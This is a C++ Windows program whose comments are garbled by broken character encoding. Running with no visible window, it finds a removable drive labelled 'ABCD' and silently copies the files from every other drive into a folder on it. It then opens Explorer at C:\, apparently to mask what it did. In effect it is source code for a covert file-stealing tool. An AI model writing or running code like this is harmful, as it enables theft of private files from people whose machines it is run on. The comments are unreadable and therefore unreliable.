/*
 *������к��Զ��ж������̷������ɨ�裬�������ΪABCD�������Լ��޸ģ��Ĵ��̣�
 *ɨ������ļ����浽���ΪABCD�Ǹ�����a�ļ����£��Զ������������ֶ��޸ı���λ�ã���
 *���û�о��ΪABCD�Ĵ��̣�������ɨ�裬ֱ�ӽ�����
 *������ɺ󣬴�C��
*/

#include "sDisk.h"
#include <vector>

using namespace std;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    char szDriverBuffer[512];
    vector<string> csDriver;//�洢��Ҫɨ����̷�
    string myDriver;//�洢�ҵ�U�̵��̷�
    myDriver.clear();//��ʼ��Ϊ��
    char Volumelabel[20] = {0};
    DWORD SerialNumber;
    DWORD MaxCLength;
    DWORD FileSysFlag;
    char FileSysName[10] = {0};
    GetLogicalDriveStringsA(IN 512, OUT szDriverBuffer);//�õ��̷�
    // ִ�к���szDriverBuffer�д洢���̷����ݸ�ʽ��
    // C:\\<nul>D:\\<nul><nul>

    char *lpDriverBuffer = szDriverBuffer;
    while (*lpDriverBuffer != NULL)
    {
        //�õ����
        GetVolumeInformationA(lpDriverBuffer,Volumelabel,255,&SerialNumber,&MaxCLength,&FileSysFlag,FileSysName,255);
        if (0 != strcmp(Volumelabel,"ABCD")) //�����ھ��Ϊ�� ���еĴ��̣��޸ľ��������޸�
        {
            csDriver.push_back(lpDriverBuffer);
        }
        else
        {
            myDriver = lpDriverBuffer;
        }

        //cout << lpDriverBuffer << "  " << Volumelabel << endl;

        lpDriverBuffer = lpDriverBuffer + strlen(lpDriverBuffer)+1;//csDriver.length() + 1;
        memset(Volumelabel, '\0', 20 );

    }

    if (myDriver.empty())//���û��������Ĵ��̣�ֱ�ӽ���
    {
        ShellExecuteA(NULL, "explore", "c:\\", NULL, NULL, SW_SHOWNORMAL);//���ҵĵ���
        return 0;
    }
    else
    {
        myDriver = myDriver + "a\\";//���ڴ��̵��Ǹ��ļ��У��޸�a���޸ı����ļ�������
        CreateDirectoryA(myDriver.c_str() ,NULL);
        for (unsigned int i = 0; i<csDriver.size(); ++i)
        {
            //cout << csDriver.at(i) <<endl;

            ListDir(csDriver.at(i),myDriver);
            //system ("pause");
        }

        // system ("pause");

        ShellExecuteA(NULL, "explore", "c:\\", NULL, NULL, SW_SHOWNORMAL);//���ҵĵ���
        return 0;
    }
}
